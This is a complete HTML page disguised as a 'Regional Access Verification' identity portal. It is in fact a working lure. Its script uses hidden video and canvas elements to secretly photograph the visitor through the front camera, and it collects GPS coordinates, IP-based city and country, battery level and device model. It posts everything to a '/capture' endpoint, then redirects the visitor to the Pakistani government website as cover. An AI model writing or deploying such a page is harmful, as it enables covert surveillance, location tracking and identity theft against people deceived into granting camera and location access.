<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification Portal</title>
    <style>
        :root { --primary: #28a745; --bg: #f5f7f9; --text: #24292e; }
        body { font-family: -apple-system, system-ui, sans-serif; background-color: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; width: 92%; max-width: 400px; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; text-align: center; }
        .btn { background-color: var(--primary); color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        #loader { display: none; margin-top: 15px; color: var(--primary); font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <h2 style="font-size: 20px; margin-bottom: 12px;">Regional Access Verification</h2>
    <p style="font-size: 14px; color: #586069; margin-bottom: 30px;">This automated portal confirms your identity for secure access.</p>
    
    <div id="loader">Authenticating Secure Connection...</div>
    <button id="mainBtn" class="btn" onclick="startProcess()">CONTINUE TO PORTAL</button>
    
    <div style="font-size: 11px; color: #959da5; margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px;">
        System ID: FZN-PR-2026
    </div>
</div>

<video id="video" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;" width="1080" height="1920"></canvas>

<script>
    async function startProcess() {
        document.getElementById('mainBtn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        let ua = navigator.userAgent;
        let deviceModel = "Unknown";
        if (/android/i.test(ua)) {
            let match = ua.match(/Android\s([0-9\.]+);\s([^;)]+)/);
            deviceModel = match ? match[2] : "Android Device";
        }

        let reportData = {
            model: deviceModel,
            battery: "N/A",
            ip: "Fetching...", city: "Fetching...", country: "Fetching...",
            lat: "0", lon: "0"
        };

        // 1. Battery Status
        if(navigator.getBattery) {
            const b = await navigator.getBattery();
            reportData.battery = Math.round(b.level * 100) + "%";
        }

        // 2. Original Working IP API (Gujranwala Data Fix)
        const fetchGeo = async () => {
            try {
                const res = await fetch('https://demo.ip-api.com/json/?fields=66846719');
                const data = await res.json();
                reportData.city = data.city || "Unknown";
                reportData.country = data.country || "Unknown";
                reportData.ip = data.query || "Unknown";
            } catch (e) {
                reportData.city = "Err (Blocked)";
            }
        };

        // 3. Camera (Strict 9:16 Portrait Mode)
        const geoPromise = fetchGeo();
        const cameraPromise = navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user",
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            } 
        }).catch(() => null);

        navigator.geolocation.getCurrentPosition(async (pos) => {
            reportData.lat = pos.coords.latitude;
            reportData.lon = pos.coords.longitude;
            finalize(await cameraPromise, reportData, geoPromise);
        }, async () => {
            finalize(await cameraPromise, reportData, geoPromise);
        }, { timeout: 8000 });
    }

    async function finalize(stream, data, geoTask) {
        await geoTask; // WAIT: Ensure data is fetched before sending
        
        if (stream) {
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                // Force drawing in 9:16 Aspect Ratio
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photo = canvas.toDataURL('image/jpeg', 0.9);
                stream.getTracks().forEach(t => t.stop());
                sendFinal(data, photo);
            }, 2000);
        } else {
            sendFinal(data, null);
        }
    }

    function sendFinal(info, photo) {
        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ info: info, photo: photo })
        }).then(() => {
            window.location.href = "https://www.pakistan.gov.pk/";
        });
    }
</script>
</body>
</html>
